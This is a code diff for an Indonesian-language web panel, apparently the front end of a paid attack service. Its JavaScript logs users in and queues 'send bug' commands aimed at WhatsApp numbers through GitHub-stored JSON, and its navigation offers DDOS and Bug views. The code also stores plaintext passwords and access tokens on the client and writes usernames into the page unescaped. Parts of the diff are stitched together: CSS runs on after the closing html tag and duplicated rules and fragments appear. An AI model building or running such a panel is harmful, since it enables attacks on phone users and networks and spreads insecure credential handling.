+    let bugs = content || { server: "Active", data: [] };
+
+    // Tambahkan entry baru ke data[]
+    bugs.data.push({
+      command: command,
+      status: "pending"
+    });
+
+    // Update ke GitHub (idch.json)
+    await githubPut(API_BUGS, TOKEN_BUGS, bugs, `send bug ${command}`, sha);
+
+    // 🔥 Update activity.json biar naik jumlahnya
+    const act = await githubGet(API_ACTIVITY, TOKEN_ACTIVITY);
+    let actData = act.content || { Activitas: 0 };
+    actData.Activitas = (parseInt(actData.Activitas) || 0) + 1;
+    await githubPut(API_ACTIVITY, TOKEN_ACTIVITY, actData, "update activity", act.sha);
+
+    // ✅ Refresh tampilan activity
+    loadActivity();
+
+    // ✅ Notif sukses + animasi
+    showPopupNotif(`Bug berhasil dikirim ke ${num}`);
+
+  } catch(err){
+    msg.textContent = "Gagal kirim bug: " + err.message;
+    msg.style.color = "var(--danger)";
+  }
+});
+
+    // ====== CONFIG (Dari Anda) ======
+
+
+    // ====== STATE ======
+    let state = {
+      user:null, role:null,
+      loginSha:null, loginList:[],
+      numbersSha:null, numbers:[],
+    }
+
+    // ====== UTIL ======
+    async function githubGet(url, token){
+      const res = await fetch(url, {headers:{Authorization:`token ${token}`, Accept:'application/vnd.github+json'}});
+      if(res.status === 404){
+        return {content:null, sha:null, notFound:true}
+      }
+      if(!res.ok){ throw new Error('GitHub GET failed: '+res.status) }
+      const data = await res.json();
+      const decoded = data.content ? JSON.parse(atob(data.content)) : null;
+      return {content:decoded, sha:data.sha}
+    }
+
+    async function githubPut(url, token, jsonContent, message, sha){
+      const body = {
+        message,
+        content: btoa(JSON.stringify(jsonContent, null, 2)),
+        sha: sha || undefined
+      }
+      const res = await fetch(url, {
+        method:'PUT',
+        headers:{'Content-Type':'application/json', Authorization:`token ${token}`, Accept:'application/vnd.github+json'},
+        body: JSON.stringify(body)
+      });
+      if(!res.ok){
+        const t = await res.text();
+        throw new Error('GitHub PUT failed: '+res.status+' '+t)
+      }
+      return await res.json();
+    }
+
+    function toast(el, msg, ok=true){ el.textContent = msg; el.style.color = ok? 'var(--success)':'var(--danger)'; }
+
+    function setView(id){
+  // sembunyikan semua view
+  document.querySelectorAll('main[id^="view-"]').forEach(m => {
+    m.classList.add('hidden');
+    m.classList.remove('visible'); // reset animasi
+  });
+
+  // tampilkan target
+  const target = document.getElementById('view-'+id);
+  if(target){
+    target.classList.remove('hidden');
+    // delay supaya browser reset style → animasi muncul lagi
+    setTimeout(()=> target.classList.add('visible'), 50);
+  }
+
+  // update menu drawer
+  document.querySelectorAll('.menu a').forEach(a => a.classList.remove('active'));
+  const link = document.querySelector(`.menu a[data-view="${id}"]`);
+  if(link) link.classList.add('active');
+
+  drawer.classList.remove('open');
+  window.scrollTo({top:0, behavior:'smooth'});
+}
+
+function showBugSuccess(msg) {
+  const bugMsg = document.getElementById("bugMsg");
+  bugMsg.textContent = msg;
+  bugMsg.style.color = "lime";
+
+  // ✅ Tambahkan animasi ke card Bug
+  const bugCard = bugMsg.closest(".card");
+  bugCard.classList.remove("success-anim"); // reset dulu kalau ada
+  void bugCard.offsetWidth;                 // trigger reflow biar animasi bisa ulang
+  bugCard.classList.add("success-anim");
+}
+    
+    function parseExpired(input){
+  const now = new Date();
+  if(!input) return null;
+
+  const trimmed = input.trim().toLowerCase();
+
+  // kalau cuma angka → default = hari
+  if(/^\d+$/.test(trimmed)){
+    now.setDate(now.getDate() + parseInt(trimmed));
+    return now.toISOString();
+  }
+
+  const m = trimmed.match(/(\d+)\s*(hari|jam|h|j)/i);
+  if(!m) return null;
+
+  const val = parseInt(m[1]);
+  const unit = m[2];
+
+  if(unit.startsWith('h')) now.setDate(now.getDate() + val);   // hari/h
+  else if(unit.startsWith('j')) now.setHours(now.getHours() + val); // jam/j
+
+  return now.toISOString();
+}
+
+    // ====== LOGIN FLOW ======
+    async function loadLogins(){
+  const {content, sha} = await githubGet(API_LOGIN, TOKEN_LOGIN);
+
+  if(Array.isArray(content)){
+    state.loginList = content;
+  } else if(content && typeof content === "object"){
+    // kalau object tunggal, bungkus jadi array
+    state.loginList = [content];
+  } else {
+    state.loginList = [];
+  }
+
+  state.loginSha = sha;
+}
+
+async function deleteAccount(username){
+  try {
+    // filter akun yang bukan username ini
+    state.loginList = state.loginList.filter(acc => acc.username !== username);
+
+    // simpan ke GitHub
+    await githubPut(API_LOGIN, TOKEN_LOGIN, state.loginList, `delete user ${username}`, state.loginSha);
+
+    // reload list & render ulang
+    await loadLogins();
+    renderAccounts();
+
+    toast(accMsg, `Akun "${username}" berhasil dihapus`, true);
+  } catch(e){
+    toast(accMsg, `Gagal hapus akun`, false);
+  }
+}
+
+    async function doLogin(username, password){
+  await loadLogins();
+  const found = state.loginList.find(u => u.username === username && u.password === password);
+  if(!found) return null;
+
+  if(found.expired){
+    const expDate = new Date(found.expired).getTime();
+    if(Date.now() > expDate){
+      // hapus akun expired
+      state.loginList = state.loginList.filter(x=>x.username !== username);
+      await githubPut(API_LOGIN, TOKEN_LOGIN, state.loginList, `delete expired user ${username}`, state.loginSha);
+      throw new Error("Akun sudah kedaluwarsa dan dihapus");
+    }
+  }
+
+  state.user = username; 
+  state.role = found.role;
+  localStorage.setItem('session', JSON.stringify({u:username, r:found.role}));
+  return found;
+}
+
+    function restoreSession(){
+  const s = localStorage.getItem('session');
+  if(!s){
+    setView('login'); // kalau belum login → tampilkan login
+    return;
+  }
+
+  const {u, r} = JSON.parse(s);
+  state.user = u; 
+  state.role = r;
+
+  document.getElementById('who').textContent = u + ' • ' + r;
+  document.getElementById('userBadge').classList.remove('hidden');
+  document.getElementById('roleChip').textContent = r;
+  if(r==='admin') document.getElementById('adminSection').classList.remove('hidden');
+  document.getElementById('btnHamburger').classList.remove('hidden');
+  document.getElementById('btnProfile').classList.remove('hidden');
+
+    // 🔥 panggil nav biar muncul
+    showBottomNav();
+
+  showBottomNav(); 
+  setView('dashboard');
+        startNotifCycle();
+  loadNumbers();
+}
+
+    function logout(){
+      localStorage.removeItem('session'); location.reload();
+    }
+
+   // ----- Bottom nav helpers -----
+function setActiveBottomNav(view){
+  const items = document.querySelectorAll('#bottomNav a[data-view]');
+  items.forEach(a => {
+    if(a.dataset.view === view) a.classList.add('active');
+    else a.classList.remove('active');
+  });
+}
+
+function showBottomNav(){
+  const bottomNav = document.getElementById('bottomNav');
+  if(!bottomNav) return;
+
+  bottomNav.classList.remove('hidden');
+  void bottomNav.offsetWidth;
+  bottomNav.classList.add('show');
+  setActiveBottomNav('dashboard');
+
+  // Tambahkan event listener click setelah nav tampil
+  bottomNav.querySelectorAll('a[data-view]').forEach(a=>{
+    a.onclick = (e)=>{
+      e.preventDefault();
+      const v = a.dataset.view;
+      setView(v);
+      setActiveBottomNav(v);
+
+      if(v==='numbers'){ loadNumbers(); }
+      if(v==='accounts'){ 
+  if(state.role === 'admin'){
+    loadLogins(); 
+    renderAccounts(); 
+  } else {
+    setView('accounts-blocked');
+  }
+}
+    };
+  });
+}
+
+let slideIndex = 0;
+let slidesBox;
+
+function showSlidesBox() {
+  slidesBox.forEach((el) => el.classList.remove("active", "prev"));
+
+  const prevIndex = slideIndex;
+  slideIndex = (slideIndex + 1) % slidesBox.length;
+
+  slidesBox[prevIndex].classList.add("prev");
+  slidesBox[slideIndex].classList.add("active");
+
+  setTimeout(showSlidesBox, 2000); // ganti tiap 4 detik
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+  slidesBox = document.querySelectorAll(".slideshow-box .slide-box");
+  if (slidesBox.length > 0) {
+    slidesBox[0].classList.add("active");
+    setTimeout(showSlidesBox, 4000);
+  }
+});
+
+// click handlers: show text on active, change view
+document.querySelectorAll('#bottomNav a[data-view]').forEach(a=>{
+  a.addEventListener('click', e=>{
+    e.preventDefault();
+    const v = a.dataset.view;
+    setView(v);
+    setActiveBottomNav(v);
+  });
+});
+
+// Optional: when setView() is called elsewhere, also sync bottom nav
+// If you want ensure sync, modify setView to call setActiveBottomNav(id) at the end.
+const _origSetView = setView;
+setView = function(id){
+  _origSetView(id);
+  // sync bottom nav if visible
+  const bn = document.getElementById('bottomNav');
+  if(bn && bn.classList.contains('show')) setActiveBottomNav(id);
+}
+
+    // ====== ACCOUNTS (ADMIN) ======
+    function renderAccounts(){
+  const body = document.getElementById('accountsTable');
+  body.innerHTML = '';
+
+  state.loginList.forEach((acc, i) => {
+    let expiredText = "Tidak ada";
+
+    if(acc.expired){
+      const expDate = new Date(acc.expired).getTime();
+      const now = Date.now();
+      const diff = expDate - now;
+      const daysLeft = Math.ceil(diff / (1000*60*60*24));
+
+      if(daysLeft > 0){
+        expiredText = `${daysLeft} hari lagi`;
+      } else {
+        expiredText = `Lewat ${Math.abs(daysLeft)} hari`;
+      }
+    }
+
+    const tr = document.createElement('tr');
+    tr.innerHTML = `
+      <td>${i+1}</td>
+      <td>${acc.username}</td>
+      <td>${acc.role}</td>
+      <td>${expiredText}</td>
+      <td>
+        <button class="btn small danger" onclick="deleteAccount('${acc.username}')">Hapus</button>
+      </td>
+    `;
+    body.appendChild(tr);
+  });
+}
+
+    async function createAccount(u,p,r,expInput){
+  if(!u||!p) throw new Error('Username & password wajib');
+  if(state.loginList.some(x=>x.username===u)) throw new Error('Username sudah ada');
+
+  // parse di sini, bukan langsung simpan expInput
+  const expDate = parseExpired(expInput);
+
+  if(!Array.isArray(state.loginList)) state.loginList = [];
+
+  state.loginList.push({
+    username: u,
+    password: p,
+    role: r,
+    expired: expDate || null
+  });
+
+  await githubPut(API_LOGIN, TOKEN_LOGIN, state.loginList, `create user ${u}`, state.loginSha);
+  await loadLogins();
+  renderAccounts();
+}
+
+    // ====== UI WIRING ======
+    const formLogin = document.getElementById('formLogin');
+    const loginMsg = document.getElementById('loginMsg');
+    const numMsg   = document.getElementById('numMsg');
+    const accMsg   = document.getElementById('accMsg');
+    const drawer   = document.getElementById('drawer');
+
+    document.getElementById('btnHamburger').onclick = ()=> drawer.classList.toggle('open');
+
+    document.querySelectorAll('.menu a[data-view]').forEach(a=>{
+      a.addEventListener('click', async (e)=>{
+        e.preventDefault(); const v = a.dataset.view; setView(v);
+        if(v==='numbers'){ await loadNumbers(); }
+        if(v==='accounts'){ await loadLogins(); renderAccounts(); }
+      })
+    })
+
+    formLogin.addEventListener('submit', async (e)=>{
+      e.preventDefault(); 
+      loginMsg.textContent = 'Memeriksa…';
+      const u = document.getElementById('username').value.trim();
+      const p = document.getElementById('password').value.trim();
+      try{
+        const ok = await doLogin(u,p);
+        if(!ok){ 
+          toast(loginMsg, 'Username atau password salah', false); 
+          return; 
+        }
+        toast(loginMsg, 'Berhasil masuk');
+        document.getElementById('who').textContent = u + ' • ' + ok.role;
+        document.getElementById('userBadge').classList.remove('hidden');
+        document.getElementById('roleChip').textContent = ok.role;
+        if(ok.role==='admin') document.getElementById('adminSection').classList.remove('hidden');
+        document.getElementById('btnHamburger').classList.remove('hidden');
+  document.getElementById('btnProfile').classList.remove('hidden');
+
+    // 🔥 panggil nav biar muncul
+    showBottomNav();
+        setView('dashboard');
+        await loadNumbers();
+      }catch(err){ 
+        toast(loginMsg, err.message, false); 
+      }
+    });
+
+    document.getElementById('btnAddNumber').onclick = async()=>{
+      const field = document.getElementById('numberInput');
+      try{ await addNumber(field.value.trim()); toast(numMsg,'Nomor ditambahkan'); field.value=''; }
+      catch(e){ toast(numMsg, e.message, false) }
+    }
+
+    document.getElementById('btnCreate').onclick = async()=>{
+  const u   = document.getElementById('newUser').value.trim();
+  const p   = document.getElementById('newPass').value.trim();
+  const r   = document.getElementById('newRole').value; 
+  const exp = document.getElementById('newExpired').value.trim() || null;
+
+  try { 
+    await createAccount(u,p,r,exp); 
+    toast(accMsg,'Akun dibuat');
+    document.getElementById('newUser').value='';
+    document.getElementById('newPass').value='';
+    document.getElementById('newExpired').value='';
+  } catch(e){ 
+    toast(accMsg, e.message, false); 
+  }
+}
+
+    // Reveal on scroll
+    const io = new IntersectionObserver((entries)=>{
+      entries.forEach(e=>{ if(e.isIntersecting) e.target.classList.add('visible') })
+    }, {threshold:.15});
+    document.querySelectorAll('.reveal').forEach(el=> io.observe(el));
+    
+    // Reveal untuk bug-card (staggered animasi)
+const bugCards = document.querySelectorAll('.bug-card');
+const ioBug = new IntersectionObserver((entries)=>{
+  entries.forEach(e=>{
+    if(e.isIntersecting){
+      bugCards.forEach((card, idx)=>{
+        setTimeout(()=> card.classList.add('visible'), idx * 200); // delay 200ms per item
+      });
+      ioBug.disconnect();
+    }
+  });
+}, {threshold:.2});
+if(bugCards.length) ioBug.observe(bugCards[0]);
+
+// Start
+    restoreSession();
+
+document.addEventListener("DOMContentLoaded", () => {
+  const btnProfile = document.getElementById('btnProfile');
+  const profileCard = document.getElementById('profileCard');
+  const closeProfile = document.getElementById('closeProfile');
+  const profileUsername = document.getElementById('profileUsername');
+  const profilePassword = document.getElementById('profilePassword');
+  const profileExpired = document.getElementById('profileExpired');
+  const profileLogout = document.getElementById('profileLogout');
+
+  function daysLeft(exp){
+    if(!exp) return "Tidak ada";
+    const expDate = new Date(exp).getTime();
+    const now = Date.now();
+    const diff = expDate - now;
+    const days = Math.ceil(diff / (1000*60*60*24));
+    return days > 0 ? `${days} hari lagi` : `Expired ${Math.abs(days)} hari lalu`;
+  }
+
+  btnProfile.addEventListener("click", async () => {
+    await loadLogins();
+    const found = state.loginList.find(u => u.username === state.user);
+    if(found){
+      profileUsername.textContent = found.username;
+      profilePassword.textContent = found.password;
+      profileExpired.textContent = daysLeft(found.expired);
+    }
+    profileCard.classList.add('show');
+  });
+
+  closeProfile.addEventListener("click", () => {
+    profileCard.classList.remove('show');
+  });
+
+  profileLogout.addEventListener("click", logout);
+});
+
+function showPopupNotif(text, success = true) {
+  const popup = document.getElementById("notifPopup");
+  const popupText = document.getElementById("notifText");
+  const popupIcon = popup.querySelector("i");
+
+  popupText.textContent = text;
+
+  if (success) {
+    popupIcon.className = "fa-solid fa-circle-check";
+    popupIcon.style.color = "lime";
+  } else {
+    popupIcon.className = "fa-solid fa-circle-xmark";
+    popupIcon.style.color = "red";
+  }
+
+  popup.classList.add("show");
+  popup.classList.remove("hidden");
+
+  // ✅ Muncul cepat, bertahan lama (3.5 detik), lalu smooth hilang
+  setTimeout(() => {
+    popup.classList.remove("show");
+    setTimeout(() => popup.classList.add("hidden"), 250);
+  }, 3500);
+}
+
+  
+
+
+
+async function startNotifCycle() {
+  try {
+    const res = await fetch("https://raw.githubusercontent.com/DaffaDevv/ACTIVITY/main/activity.json");
+    const data = await res.json();
+
+    const allMessages = Object.keys(data.Servers || {})
+      .filter(k => k.toLowerCase().startsWith("message"))
+      .map(k => data.Servers[k])
+      .filter(Boolean);
+
+    let queue = [];
+
+    function shuffleMessages() {
+      queue = [...allMessages];
+      for (let i = queue.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [queue[i], queue[j]] = [queue[j], queue[i]];
+      }
+    }
+
+    shuffleMessages();
+
+    const box = document.getElementById("topNotif");
+    const nameEl = document.getElementById("notifName");
+    const msgEl = document.getElementById("notifMsg");
+    const sound = document.getElementById("notifSound");
+    const btnClose = document.getElementById("notifClose");
+
+    function showNotif() {
+      if (!queue.length) shuffleMessages();
+
+      const msg = queue.shift();
+      if (!msg) return;
+
+      nameEl.textContent = "NOTIFICATION";
+      msgEl.textContent = msg;
+      box.classList.remove("hidden");
+
+      // mainkan suara dengan sedikit delay biar sinkron
+      if (sound) {
+        sound.currentTime = 0;
+        setTimeout(() => {
+          sound.play().catch(err => console.warn("Audio blocked:", err));
+        }, 200); // 0.2 detik setelah popup muncul
+      }
+
+      setTimeout(() => box.classList.add("hidden"), 5000);
+    }
+
+    btnClose.onclick = () => {
+      box.classList.add("hidden");
+    };
+
+    showNotif();
+    setInterval(showNotif, 20000); // jeda 20 detik
+  } catch (err) {
+    console.error("Notif error:", err);
+  }
+}
+
+</script>
+
+  <!-- Bottom Navigation -->
+  <nav id="bottomNav" class="bottom-nav hidden">
+    <a href="#" data-view="dashboard"><i class="fa-solid fa-house"></i><span>Home</span></a>
+    <a href="#" data-view="ddos"><i class="fas fa-bolt"></i><span>DDOS</span></a>
+    <a href="#" data-view="bug"><i class="fab fa-whatsapp"></i><span>Bug</span></a>
+    <a href="#" data-view="accounts"><i class="fa-solid fa-user-gear"></i><span>Admin</span></a>
+  </nav>
+
+
+<!-- Profile Card -->
+  <div id="profileCard" class="profile-card">
+    <div class="card-glass">
+      <button class="close-btn" id="closeProfile">×</button>
+      <h3 class="title"><i class="fa-solid fa-user"></i> Profil</h3>
+      <p><b>Username:</b> <span id="profileUsername"></span></p>
+      <p><b>Password:</b> <span id="profilePassword"></span></p>
+      <p><b>Expired:</b> <span id="profileExpired"></span></p>
+      <div class="space"></div>
+      <button class="btn danger" id="profileLogout">
+        <i class="fa-solid fa-arrow-right-from-bracket"></i> Logout
+      </button>
+    </div>
+  </div>
+
+  <!-- ✅ Notif Popup (bebas dari profile card) -->
+  <div id="notifPopup" class="notif-popup hidden">
+    <i class="fa-solid fa-circle-check"></i>
+    <span id="notifText">Berhasil!</span>
+  </div>
+
+<!-- 🔔 Notification Box -->
+<div id="topNotif" class="top-notif hidden" 
+     style="position:fixed; top:80px; right:20px; 
+            background:rgba(20,20,30,0.85); 
+            border:1px solid rgba(255,255,255,.12); 
+            padding:16px 20px; border-radius:14px; 
+            width:50%; max-width:400px;
+            color:white; z-index:200;">
+  <button class="close-btn" id="notifClose" 
+          style="position:absolute; top:8px; right:12px; 
+                 background:transparent; border:none; 
+                 color:white; font-size:18px; cursor:pointer;">×</button>
+  <div class="notif-body">
+    <h4><i class="fa-solid fa-bell"></i> <span id="notifName">NOTIFICATION</span></h4>
+    <p id="notifMsg">Pesan notifikasi...</p>
+  </div>
+</div>
+
+<!-- 🔊 Suara notifikasi -->
+<audio id="notifSound" 
+       src="https://h.top4top.io/m_3543367b91.mp3" 
+       preload="auto"></audio>
+
+</body>
+</html>  flex-direction: column;
+  align-items: center;
+  background-image: 
+      radial-gradient(circle at 20% 35%, rgba(0, 255, 162, 0.15) 0%, transparent 50%),
+      radial-gradient(circle at 75% 65%, rgba(0, 136, 255, 0.1) 0%, transparent 50%);
+  position: relative;
+}
+
+body::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-image: url("data:image/svg+xml,%3Csvg width='6' height='6' viewBox='0 0 6 6' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ffffff' fill-opacity='0.05' fill-rule='evenodd'%3E%3Cpath d='M5 0h1L0 5v1H5V0zm1 5v1H5v-1h1z'/%3E%3C/g%3E%3C/svg%3E");
+  pointer-events: none;
+  z-index: 1;
+}
+
+    a{color:inherit}/* Header */
+.nav{
+  position:fixed; inset:0 0 auto 0; height:64px; display:flex; align-items:center; justify-content:space-between;
+  padding:0 20px; background:linear-gradient(90deg, rgba(16,22,40,.6), rgba(16,22,40,.2)); backdrop-filter: blur(8px);
+  border-bottom:1px solid rgba(255,255,255,.06); z-index:50;
+}
+.brand{display:flex; align-items:center; gap:12px; font-weight:700}
+.logo{width:34px;height:34px; border-radius:12px; background: linear-gradient(135deg, var(--primary), var(--primary));
+      box-shadow: 0 6px 18px rgba(0,0,0,.45);}
+.brand h1{font-family:Orbitron, Poppins; font-size:18px; letter-spacing:1px; margin:0}
+
+.hamburger {
+  width:44px;
+  height:44px;
+  border-radius:14px;
+  display:grid;
+  place-items:center;
+  cursor:pointer;
+  background:var(--glass);
+  border:1px solid rgba(255,255,255,.08);
+  transition:.25s;
+}
+
+.hamburger i {
+  color: white; 
+  font-size: 20px; /* ✅ gedein ikon */
+}
+
+.hamburger:hover {
+  transform:translateY(-2px);
+  box-shadow:0 8px 24px rgba(0,0,0,.35);
+}
+
+/* Drawer */
+.drawer{
+  position:fixed; inset:64px auto 0 0; width:290px; background:linear-gradient(180deg, #0d1324, #0a0f1a);
+  border-right:1px solid rgba(255,255,255,.06); transform:translateX(-100%); transition:transform .35s ease;
+  z-index:40; padding:18px 16px; overflow-y:auto; box-shadow: 10px 0 40px rgba(0,0,0,.35)
+}
+.drawer.open{transform:translateX(0)}
+.menu h4{font-size:13px; color:var(--muted); text-transform:uppercase; letter-spacing:1.2px; margin:16px 12px}
+.menu a{display:flex; align-items:center; gap:12px; padding:12px 14px; margin:6px 6px; border-radius:14px; text-decoration:none; font-weight:500;
+  background:transparent; border:1px solid transparent; transition:.25s}
+.menu a:hover{background:var(--glass); border-color:rgba(255,255,255,.06)}
+.menu a.active{background:linear-gradient(90deg, rgba(155,92,255,.16), rgba(0,212,255,.10)); border-color:rgba(155,92,255,.25)}
+
+/* Layout */
+.container{max-width:1100px; margin:100px auto 60px; padding:0 18px}
+
+/* Cards */
+
+
+.card {
+  width: 100%;
+  max-width: 400px;
+  padding: 20px;
+  margin: 15px auto;
+  border-radius: 15px;
+  background-color: #111927;
+  color: #e6e6e6;
+  font-family: 'Orbitron', sans-serif;
+  font-size: 1rem;
+  text-align: left;   /* biar teks tetap rata kiri */
+  cursor: pointer;
+  transition: all 0.3s ease;
+  box-shadow: 0 8px 20px rgba(0,0,0,.45);
+  border: 1px solid rgba(0, 255, 162, 0.2);
+  position: relative;
+  overflow: hidden;
+  display: block;     /* jangan pakai flex center */
+}
+
+.card::after{display:none;}
+
+50% { left: 0%; transform: translateX(0%); }
+  100% { left: 100%; transform: translateX(0%); }
+}
+
+
+@keyframes cyberscan {
+  0% {
+    transform: translateX(-100%);
+  }
+  100% {
+    transform: translateX(100%);
+  }
+}
+
+.card:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 8px 20px rgba(0,0,0,.45);
+}
+
+.card i {
+  margin-right: 8px;
+  font-size: 1.2rem;
+  color: #28c76f;
+}
+
+
+@keyframes cyberscan {
+  0% {
+    transform: translateX(-100%);
+  }
+  100% {
+    transform: translateX(100%);
+  }
+}
+
+.card:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 8px 20px rgba(0,0,0,.45);
+  text-shadow: none;
+}
+
+.card i {
+  margin-right: 15px;
+  font-size: 1.5rem;
+  color: #28c76f;
+}
+
+.card + 
+
+.card {
+  width: 100%;
+  max-width: 400px;
+  padding: 20px;
+  margin: 15px auto;
+  border-radius: 15px;
+  background-color: #111927;
+  color: #e6e6e6;
+  font-family: 'Orbitron', sans-serif;
+  font-size: 1rem;
+  text-align: left;   /* biar teks tetap rata kiri */
+  cursor: pointer;
+  transition: all 0.3s ease;
+  box-shadow: 0 8px 20px rgba(0,0,0,.45);
+  border: 1px solid rgba(0, 255, 162, 0.2);
+  position: relative;
+  overflow: hidden;
+  display: block;     /* jangan pakai flex center */
+}
+
+.card::after{display:none;}
+
+@keyframes cyberscan {
+  0% {
+    transform: translateX(-100%);
+  }
+  100% {
+    transform: translateX(100%);
+  }
+}
+
+.card:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 8px 20px rgba(0,0,0,.45);
+}
+
+.card i {
+  margin-right: 8px;
+  font-size: 1.2rem;
+  color: #28c76f;
+}
+
+
+@keyframes cyberscan {
+  0% {
+    transform: translateX(-100%);
+  }
+  100% {
+    transform: translateX(100%);
+  }
+}
+
+.card:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 8px 20px rgba(0,0,0,.45);
+  text-shadow: none;
+}
+
+.card i {
+  margin-right: 15px;
+  font-size: 1.5rem;
+  color: #28c76f;
+}
+
+.title{font-family:Orbitron; letter-spacing:1px; margin:0 0 6px; font-size:22px}
+.subtitle{margin:0 0 18px; color:var(--muted); font-size:14px}
+
+/* Forms */
+.input, select{
+  width:100%; padding:12px 14px; border-radius:14px; border:1px solid rgba(255,255,255,.1);
+  background:rgba(7,10,20,.6); color:var(--text); outline:none; transition:.2s; font-size:14px
+}
+.input:focus, select:focus{border-color:var(--ring); box-shadow: 0 8px 20px rgba(0,0,0,.45); grid-template-columns: 1fr 1fr; gap:12px}
+.btn{
+  display:inline-flex; align-items:center; gap:10px; padding:12px 16px; border-radius:14px; border:1px solid transparent;
+  background: linear-gradient(90deg, var(--primary), var(--primary)); color:white; cursor:pointer; font-weight:600;
+  letter-spacing:.3px; box-shadow: 0 8px 22px rgba(0,0,0,.45); transition:.25s
+}
+.btn:hover{transform:translateY(-2px)}
+.btn.ghost{background:transparent; border-color:rgba(255,255,255,.12)}
+.btn.danger{background:linear-gradient(90deg, #ff6a88, #ff99ac)}
+
+/* Table */
+table{width:100%; border-collapse:separate; border-spacing:0 10px}
+th{ text-align:left; font-size:12px; color:var(--muted); font-weight:600}
+td{ background:rgba(255,255,255,.03); border:1px solid rgba(255,255,255,.06); padding:12px 14px; border-left:none; border-right:none}
+tr{ border-radius:12px}
+
+/* Hero / Login */
+.hero{
+  min-height:calc(100vh - 64px); display:grid; place-items:center; padding:28px 18px; position:relative;
+}
+.glow{position:absolute; inset:auto auto 10% -10%; width:320px; height:320px; border-radius:50%; filter:blur(6px);
+  background: none; opacity:0; pointer-events:none;}
+.login{
+  display:grid; grid-template-columns: 1.1fr 1fr; gap:30px; align-items:center; max-width:980px; width:100%;
+}
+.illus{padding:20px}
+.illus h2{font-family:Orbitron; font-size:48px; line-height:1.05; margin:0 0 12px}
+.illus p{color:var(--muted)}
+
+.login-card{padding:22px; border-radius:22px}
+.badge{display:inline-flex; align-items:center; gap:8px; padding:8px 12px; border-radius:999px; font-size:12px; color:#dfe7ff;
+  background:linear-gradient(90deg, rgba(155,92,255,.22), rgba(0,212,255,.18)); border:1px solid rgba(255,255,255,.12)}
+
+/* Animations */
+.reveal{opacity:0; transform: translateY(18px); filter: blur(6px);}
+.reveal.visible{opacity:1; transform:none; filter:none; transition: opacity .8s ease, transform .8s ease, filter .8s ease}
+.reveal.left{transform: translateX(-24px)}
+.reveal.right{transform: translateX(24px)}
+
+/* Utility */
+.hidden{display:none !important}
+.flex{display:flex; gap:12px; align-items:center}
+.space{height:18px}
+.chip{display:inline-flex; align-items:center; gap:6px; padding:6px 10px; border-radius:999px; font-size:12px;
+  background:rgba(255,255,255,.06); border:1px solid rgba(255,255,255,.08)}
+
+@media (max-width:900px){
+  .login{grid-template-columns:1fr}
+  .illus h2{font-size:38px}
+  .row{grid-template-columns:1fr}
+}
+/* Glass Select */
+.select-glass {
+  appearance: none; /* buang style bawaan */
+  background: linear-gradient(90deg, rgba(40,199,111,.08), rgba(40,199,111,.04));
+  border: 1px solid rgba(255,255,255,.12);
+  backdrop-filter: blur(8px);
+  color: var(--text);
+  padding: 12px 14px;
+  border-radius: 14px;
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: .25s;
+}
+.select-glass:hover {
+  background: linear-gradient(90deg, rgba(155,92,255,.28), rgba(0,212,255,.25));
+}
+/* Option list di dalam dropdown */
+.select-glass option {
+  background: rgba(15, 20, 35, 0.92);
+  color: var(--text);
+  border: none;
+}
+
+/* Glass Button */
+.glass-btn {
+  background: linear-gradient(90deg, rgba(40,199,111,.08), rgba(40,199,111,.04));
+  border: 1px solid rgba(255,255,255,.12);
+  backdrop-filter: blur(8px);
+  color: var(--text);
+  padding: 10px 16px;
+  border-radius: 14px;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: .25s;
+}
+.glass-btn:hover {
+  background: linear-gradient(90deg, rgba(155,92,255,.28), rgba(0,212,255,.25));
+  transform: translateY(-2px);
+}
+.dropdown-glass {
+  position: relative;
+  display: block;
+  width: 100%;
+}
+.dropdown-glass button {
+  width: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: center; /* teks + icon di tengah */
+  gap: 10px;
+  background: linear-gradient(90deg, rgba(40,199,111,.08), rgba(40,199,111,.04));
+  border: 1px solid rgba(255,255,255,.12);
+  backdrop-filter: blur(8px);
+  color: var(--text);
+  padding: 12px 14px;
+  border-radius: 14px;
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: .25s;
+}
+.dropdown-glass button:hover {
+  background: linear-gradient(90deg, rgba(155,92,255,.28), rgba(0,212,255,.25));
+}
+.dropdown-glass ul {
+  position: absolute;
+  top: 110%; left: 0; right: 0;
+  background: rgba(15,20,35,0.85); /* panel utuh */
+  border: 1px solid rgba(255,255,255,.12);
+  backdrop-filter: blur(10px);
+  border-radius: 12px;
+  list-style: none;
+  margin: 6px 0 0;
+  padding: 8px; /* kasih padding biar ada ruang di dalam */
+  z-index: 99;
+}
+
+.dropdown-glass ul li {
+  padding: 12px 14px;
+  margin-bottom: 6px; /* jarak antar item */
+  cursor: pointer;
+  color: var(--text);
+  font-weight: 500;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  border-radius: 10px;
+  background: linear-gradient(90deg, rgba(40,199,111,.08), rgba(40,199,111,.04));
+  border: 1px solid rgba(255,255,255,.12);
+  transition: .25s;
+}
+
+.dropdown-glass ul li:last-child {
+  margin-bottom: 0; /* biar item terakhir gak kepanjangan */
+}
+
+.dropdown-glass ul li:hover {
+  background: linear-gradient(90deg, rgba(155,92,255,.28), rgba(0,212,255,.25));
+}
+/* BUG FEATURE STYLE */
+.bug-wrapper {
+  display: flex;
+  flex-direction: column;
+  align-items: center;   /* semua card center */
+  gap: 20px;
+  padding: 10px 0;
+}
+
+.bug-wrapper 
+
+.card {
+  width: 100%;
+  max-width: 400px;
+  padding: 20px;
+  margin: 15px auto;
+  border-radius: 15px;
+  background-color: #111927;
+  color: #e6e6e6;
+  font-family: 'Orbitron', sans-serif;
+  font-size: 1rem;
+  text-align: left;   /* biar teks tetap rata kiri */
+  cursor: pointer;
+  transition: all 0.3s ease;
+  box-shadow: 0 8px 20px rgba(0,0,0,.45);
+  border: 1px solid rgba(0, 255, 162, 0.2);
+  position: relative;
+  overflow: hidden;
+  display: block;     /* jangan pakai flex center */
+}
